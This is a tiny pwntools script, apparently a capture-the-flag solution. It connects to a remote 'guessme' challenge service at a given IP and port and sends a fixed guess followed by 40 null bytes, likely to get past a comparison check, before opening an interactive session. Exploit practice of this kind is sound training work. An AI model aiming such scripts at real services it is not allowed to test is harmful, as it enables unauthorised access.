from pwn import *
#p=process('./guessme')
p=remote('125.235.240.166',20102)
#raw_input("DEBUG")

payload = "9a9c88bb"+"\x00"*40
p.sendline(payload)
p.interactive()